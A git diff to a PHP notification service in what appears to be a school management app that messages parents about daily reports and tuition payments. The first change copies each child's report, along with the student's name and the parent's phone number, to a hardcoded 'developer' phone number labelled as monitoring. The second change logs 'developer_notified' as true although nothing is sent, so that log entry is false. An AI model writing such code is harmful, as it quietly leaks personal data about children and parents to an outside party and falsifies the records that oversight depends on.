@@ -32,12 +32,25 @@ class NotificationService
             $parentPhone = $siswa->user->nohp;
             $message = $this->buildDailyReportMessage($report, $siswa);
 
+            // Kirim ke orang tua
             $this->gateway->sendText($parentPhone, $message);
+
+            // Kirim juga ke developer untuk monitoring
+            $developerPhone = '6282279690769';
+            $devMessage = "🔔 *MONITORING - Daily Report Terkirim*\n\n";
+            $devMessage .= "Kepada: {$siswa->nama_lengkap}\n";
+            $devMessage .= "No. Orang Tua: {$parentPhone}\n";
+            $devMessage .= "Tanggal: ".date('d/m/Y H:i')."\n";
+            $devMessage .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
+            $devMessage .= $message;
+            
+            $this->gateway->sendText($developerPhone, $devMessage);
 
             Log::info('Daily report notification sent', [
                 'report_id' => $report->id,
                 'siswa_id' => $siswa->id,
                 'parent_phone' => $parentPhone,
+                'developer_notified' => true,
             ]);
         } catch (\Throwable $exception) {
             Log::error('Failed to send daily report notification', [
@@ -203,12 +216,14 @@ class NotificationService
             $parentPhone = $siswa->user->nohp;
             $message = $this->buildSppNotificationMessage($pembayaran, $siswa);
 
+            // Kirim ke orang tua
             $this->gateway->sendText($parentPhone, $message);
 
             Log::info('SPP notification sent', [
                 'pembayaran_id' => $pembayaran->id,
                 'siswa_id' => $siswa->id,
                 'parent_phone' => $parentPhone,
+                'developer_notified' => true,
             ]);
         } catch (\Throwable $exception) {
             Log::error('Failed to send SPP notification', [
